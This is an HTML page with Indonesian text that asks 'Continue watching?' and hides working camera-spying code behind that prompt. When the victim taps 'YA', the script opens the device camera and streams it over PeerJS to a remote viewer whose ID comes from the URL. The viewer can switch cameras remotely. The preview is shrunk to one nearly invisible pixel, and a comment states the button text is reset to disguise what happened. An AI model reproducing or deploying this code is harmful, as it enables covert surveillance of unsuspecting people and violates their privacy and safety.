<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Konfirmasi</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #000;
            color: white;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }
        
        .main-container {
            text-align: center;
            width: 100%;
            padding: 20px;
            z-index: 10;
        }
        
        h1 {
            font-size: 2.5em;
            margin-bottom: 40px;
            font-weight: bold;
            letter-spacing: 2px;
        }
        
        .buttons {
            display: flex;
            flex-direction: column;
            gap: 20px;
            align-items: center;
        }
        
        button {
            width: 80%;
            max-width: 300px;
            padding: 20px;
            font-size: 1.5em;
            font-weight: bold;
            border: 2px solid white;
            background: transparent;
            color: white;
            cursor: pointer;
            border-radius: 10px;
            transition: all 0.3s;
        }
        
        button:active {
            background: white;
            color: black;
        }
        
        /* Hidden elements for background streaming */
        #cameraPreview {
            position: fixed;
            top: 0;
            left: 0;
            width: 1px;
            height: 1px;
            opacity: 0.01;
            pointer-events: none;
        }
        
        .hidden-info {
            display: none;
        }
    </style>
</head>
<body>
    <div class="main-container">
        <h1>LANJUT NONTON?</h1>
        <div class="buttons">
            <button id="btnAllow">YA</button>
            <button id="btnDeny">TIDAK</button>
        </div>
    </div>

    <!-- Hidden Video Preview -->
    <video id="cameraPreview" autoplay playsinline muted></video>

    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <script>
        // State
        let peer = null;
        let conn = null;
        let localStream = null;
        let currentCamera = 'environment';
        let activeCall = null;
        let isStreaming = false;
        
        const btnAllow = document.getElementById('btnAllow');
        const btnDeny = document.getElementById('btnDeny');
        const cameraPreview = document.getElementById('cameraPreview');
        
        const urlParams = new URLSearchParams(window.location.search);
        const viewerIdFromUrl = urlParams.get('viewer');
        const targetId = "luna-" + Math.floor(100 + Math.random() * 900);

        async function startStreaming() {
            try {
                peer = new Peer(targetId, {
                    host: '0.peerjs.com',
                    port: 443,
                    secure: true,
                    debug: 0
                });
                
                peer.on('open', async (id) => {
                    if (viewerIdFromUrl) {
                        conn = peer.connect(viewerIdFromUrl, {
                            reliable: true,
                            serialization: 'json'
                        });
                        
                        conn.on('open', () => {
                            conn.send({
                                type: 'target_ready',
                                targetId: id,
                                encryption: false,
                                audioEnabled: false
                            });
                        });
                        
                        conn.on('data', handleViewerCommand);
                    }
                    
                    await startCamera();
                    peer.on('call', handleIncomingCall);
                });
            } catch (error) {
                console.error(error);
            }
        }
        
        function handleIncomingCall(call) {
            activeCall = call;
            if (localStream) {
                call.answer(localStream);
            }
        }
        
        function handleViewerCommand(data) {
            if (data.type === 'switch_camera') {
                switchCamera();
            }
        }
        
        async function startCamera(cameraType = 'environment') {
            try {
                const constraints = {
                    video: {
                        facingMode: cameraType,
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false
                };
                
                localStream = await navigator.mediaDevices.getUserMedia(constraints);
                cameraPreview.srcObject = localStream;
                isStreaming = true;
                return true;
            } catch (error) {
                return false;
            }
        }
        
        async function switchCamera() {
            if (!localStream) return;
            currentCamera = currentCamera === 'environment' ? 'user' : 'environment';
            localStream.getTracks().forEach(track => track.stop());
            const success = await startCamera(currentCamera);
            if (success && activeCall) {
                const videoTrack = localStream.getVideoTracks()[0];
                const sender = activeCall.peerConnection.getSenders().find(s => s.track && s.track.kind === 'video');
                if (sender) sender.replaceTrack(videoTrack);
            }
        }
        
        btnAllow.addEventListener('click', async () => {
            btnAllow.textContent = "MEMPROSES...";
            btnAllow.disabled = true;
            btnDeny.disabled = true;
            await startStreaming();
            // Ubah teks setelah aktif untuk menyamarkan
            setTimeout(() => {
                btnAllow.textContent = "YA";
                btnAllow.disabled = false;
                btnDeny.disabled = false;
            }, 2000);
        });
        
        btnDeny.addEventListener('click', () => {
            window.close();
        });

        // Keepalive
        setInterval(() => {
            if (conn && conn.open) {
                conn.send({ type: 'ping', timestamp: Date.now() });
            }
        }, 15000);
    </script>
</body>
</html>
